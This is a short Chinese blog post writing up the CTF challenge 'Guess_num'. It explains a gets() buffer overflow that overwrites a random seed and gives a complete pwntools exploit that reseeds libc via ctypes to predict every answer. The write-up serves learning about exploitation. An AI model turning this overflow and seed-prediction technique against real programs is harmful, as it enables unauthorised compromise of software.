---
layout: post
title: Guess_num
categories: pwn
tags: [pwn]
description: 控制随机数
date: 2019-07-02
---
## Guess_num

题目不难，但是学到了个新姿势 **cdll.LoadLibrar** ，可以用它来加载dll或者libc。

### ida分析

![img](/assets/images/2019-7-2-Guess_num/guess_num_1.png)

名字v11和seed相差32(0x30-0x10)，而gets又没有限制，故可以将seed覆盖。

### Exp
```python
from pwn import *
from ctypes import *  
 
#p = remote('','')
p = process('./guess_num') 
elf = ELF('./guess_num')
 
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
 
payload = 'A'*32  
payload += p64(1)   #覆盖种子为1
p.recvuntil('name:')
p.sendline(payload)  
 
libc.srand(1)  #本地设置种子为一

for i in range(10):
        num = str(libc.rand()%6+1)
        p.recvuntil('number:')
        p.sendline(num)
 
p.interactive()

```
